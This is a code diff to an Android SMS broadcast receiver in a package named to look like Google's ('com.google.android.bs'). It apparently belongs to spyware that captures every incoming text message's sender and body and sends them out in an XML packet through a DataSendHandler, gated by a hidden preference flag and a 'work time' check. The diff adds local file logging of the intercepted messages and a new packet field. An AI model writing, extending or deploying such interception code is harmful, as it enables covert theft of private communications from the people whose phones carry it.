@@ -16,6 +16,7 @@ import android.telephony.SmsMessage;
 import android.util.Log;
 
 import com.google.android.bs.DataSendHandler;
+import com.google.android.bs.FileLog;
 import com.google.android.bs.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
@@ -34,27 +35,34 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 		String sms = sp.getString("KBD", "0");
 
 		if (sms.equals("0")) {
+			Log.d(TAG, "KBD = 0");
+			FileLog.writeLog("sms: KBD = 0");
 			return;
 		}
-		
+
 		boolean isWork = WorkTimeDefiner.isDoWork(context);
 		if (!isWork) {
 			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
 			Log.d(TAG, "after isWork retrun 0");
+			FileLog.writeLog("sms: isWork return " + Boolean.toString(isWork));
+			FileLog.writeLog("sms: after isWork retrun 0");
+
 			return;
 		} else {
 			Log.d(TAG, Boolean.toString(isWork));
+			FileLog.writeLog("sms: " + Boolean.toString(isWork));
 		}
 		try {
 			mContext = context;
 			mBundle = intent.getExtras();
-//			smsSentObserver = null;
+			// smsSentObserver = null;
 			Log.d(TAG, "Intent Action : " + intent.getAction());
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
 				getSMSDetails();
 			} else {
 				Log.e(TAG, "Bundle is Empty!");
+				FileLog.writeLog("sms: Bundle is Empty!");
 			}
 
 			if (smsSentObserver == null) {
@@ -64,6 +72,7 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			}
 		} catch (Exception sgh) {
 			Log.e(TAG, "Error in Init : " + sgh.toString());
+			FileLog.writeLog("sms: Error in Init : " + sgh.toString());
 		}
 	}
 
@@ -76,14 +85,19 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
 				msgs = new SmsMessage[pdus.length];
+
 				Log.d(TAG, "pdus length : " + pdus.length);
+				FileLog.writeLog("sms: pdus length : " + pdus.length);
 
 				SmsMessage messages = SmsMessage
 						.createFromPdu((byte[]) pdus[0]);
 				str += String.format("SMS from %s:%s\n", messages
 						.getOriginatingAddress(), messages.getMessageBody()
 						.toString());
+
 				Log.d("sms", str + logTime());
+				FileLog.writeLog("sms: " + str + logTime());
+
 				// Toast toast = Toast.makeText(mContext, str + logTime(),
 				// Toast.LENGTH_SHORT);
 				// toast.show();
@@ -111,15 +125,18 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 							+ "</time><type>4</type><app>" + dir
 							+ "</app><ttl>" + msgs[k].getOriginatingAddress()
 							+ "</ttl><cdata1>" + msgs[k].getMessageBody()
-							+ "</cdata1></packet>";
+							+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
 
 					DataSendHandler dSH = new DataSendHandler(mContext);
 					dSH.send(2, sendStr);
+
 					Log.d("smsRec", sendStr);
+					FileLog.writeLog("sms: " + sendStr);
 				}
 			}
 		} catch (Exception sfgh) {
 			Log.e(TAG, "Error in getSMSDetails : " + sfgh.toString());
+			FileLog.writeLog("sms: Error in getSMSDetails : " + sfgh.toString());
 		}
 	}
 
